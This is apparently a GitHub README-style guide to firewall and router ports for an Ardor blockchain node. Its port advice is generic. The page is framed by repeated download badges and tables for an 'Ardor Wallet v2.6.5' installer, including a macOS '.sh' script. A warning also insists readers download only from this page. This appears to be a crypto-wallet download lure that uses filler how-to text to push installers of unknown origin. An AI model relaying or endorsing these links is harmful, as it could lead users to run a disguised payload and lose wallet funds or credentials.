![Ardor Wallet guide](assets/banner-article.png)

# Ardor node ports and the firewall rules that block them

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

A full Ardor node needs to accept connections from peers, and a blocked port is the most common reason a first sync sits at zero peers. The fix is a firewall rule that allows the node's peer port, and on a home network the same rule has to exist on the router.

## Why ports matter at all

A node is not a browser. It does not only make outgoing requests; it also listens, so other nodes can connect to it, ask for blocks and offer their own. That listening socket is a port, and if it is closed the [Ardor node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) can still reach out but far fewer peers will reach back.

The visible symptom is precise and easy to check: the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)'s node screen shows a peer count. Zero peers means nobody is connected; a handful that come and go means connections are being made but not held.

## Which port to open

The peer port is set in the node's properties file and has a documented default. Read the value from the configuration rather than assuming it, then confirm that the same value is open in the firewall on every machine between the node and the network.

If you changed the port in the properties file, the firewall rule has to change with it. A rule for the previous port is worse than none, because it looks correct in the firewall list and protects nothing.

## Windows firewall

1. Open Windows Defender Firewall and choose advanced settings.
2. Create a new inbound rule for a port.
3. Enter the node's peer port and allow TCP.
4. Apply it to the network profile you actually use - private for a home network, not public.
5. Start the node and check the peer count.

Applying a rule to the wrong profile is the classic mistake: the rule exists, the firewall list looks right, and the connection is still blocked because the network is classified as public.

## Linux and macOS

On Linux, the distribution's firewall is usually the gate: `ufw` on Ubuntu, `firewalld` on Fedora-family systems. Open the peer port for TCP and reload the firewall.

On macOS, the application firewall prompts the first time the node listens. Approve it, and check afterwards that the allowance was recorded for the [Ardor Java](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md) process rather than for a transient child process.

## Routers and home networks

A home router adds a second gate. Port forwarding maps an external port to the machine running the node, and without it the node can connect out but cannot be reached from outside.

Forwarding is optional for a node that only needs to read the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md), and useful for one that wants to serve blocks to others. If you forward a port, keep the machine's local address stable, or the rule will point at the wrong device after a reboot and the node will look unreachable for no visible reason.

## Testing whether it worked

Start the node, wait a minute, and read the peer count again. A healthy node holds several peers and the height climbs; a node with one peer that never sends blocks is usually still blocked somewhere.

If the count stays at zero after the firewall rule, check the router, then check whether the machine has two firewalls active - a common situation when a third-party security suite runs alongside the system one, and one where the rule you added is silently being overruled by a product you forgot was installed.

## Nodes in containers and virtual machines

A node inside a container or a virtual machine has two network layers, and the port has to be open in both. Opening it on the host and leaving it closed inside the container produces exactly the same zero-peer result as opening neither.

Virtual machine networking adds a third case: a bridged adapter behaves like a separate machine on the network, while a NAT adapter hides it behind the host. A node on a NAT adapter needs the port forwarded from the host before anything outside can reach it.

## What healthy looks like

A node that is working holds several peers, and its height climbs steadily toward the chain tip. It does not need dozens; three or four stable connections are enough to follow the chain.

A node with peers whose height never moves is a different problem: the connection is fine and the node is not receiving blocks, which points at version or disk rather than firewall. Read the two signals separately before changing anything.

## What a blocked port actually costs

Nothing in terms of funds. A node with no inbound connections can still sync, slowly, using the peers it manages to reach. It forges badly or not at all, because it sees blocks late.

That is why a blocked port shows up as a performance problem rather than an error. The node works, just poorly, and the cause is invisible unless you look at the peer count.

## FAQ

### Can I run a node without opening any ports?

Yes. It will have fewer peers and sync more slowly, and forging will be unreliable.

### Which port does the node use?

The port in the node's properties file, which has a documented default. Read it there rather than guessing.

### Do I need port forwarding on a home network?

Only if you want the node reachable from outside. Without it, the node can still connect out and sync.

### Why do I still have zero peers after opening the port?

Check the firewall profile, a second security suite, and the router rule. One of the three is usually still blocking.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md)
- [Run an Ardor node from source](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/run-an-ardor-node-from-source.md)
- [Fix the Java error that stops the Ardor wallet](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
